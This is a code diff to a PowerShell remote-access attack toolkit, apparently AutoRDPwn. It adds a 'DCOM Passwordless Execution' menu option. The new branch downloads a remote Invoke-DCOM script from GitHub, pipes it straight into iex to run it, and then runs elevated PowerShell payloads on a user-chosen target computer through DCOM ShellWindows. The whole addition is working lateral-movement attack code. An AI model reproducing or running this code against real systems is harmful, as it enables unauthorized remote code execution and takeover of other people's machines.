@@ -33,6 +33,7 @@ function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - InvokeCommand / PSSession" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Assistance" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Session Hijacking (local)" -ForegroundColor Gray
+     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - DCOM Passwordless Execution" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt1" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
      Write-Host }
@@ -316,6 +317,17 @@ if($Language -in 'Spanish') {
 	tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
         else{ Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 ; $input = $null ; Show-Banner ; Show-Menu }}
 
+	'7' {
+	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
+	$computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
+	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; $hash = "true"
+	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1" -UseBasicParsing | iex
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn1"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn2"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn3"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn4"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn5" }
+
         'M' { Show-Banner ; Show-Modules
         $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine() ; Write-Host
@@ -462,7 +474,7 @@ if($Language -in 'Spanish') {
 
         if($module -like 'X'){ $input = 'x' ; continue }
 
-	if($module -in '1','2','3','4','5','6','m','x') { $null }
+	if($module -in '1','2','3','4','5','6','7','m','x') { $null }
         else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}
 
         'X' { continue }
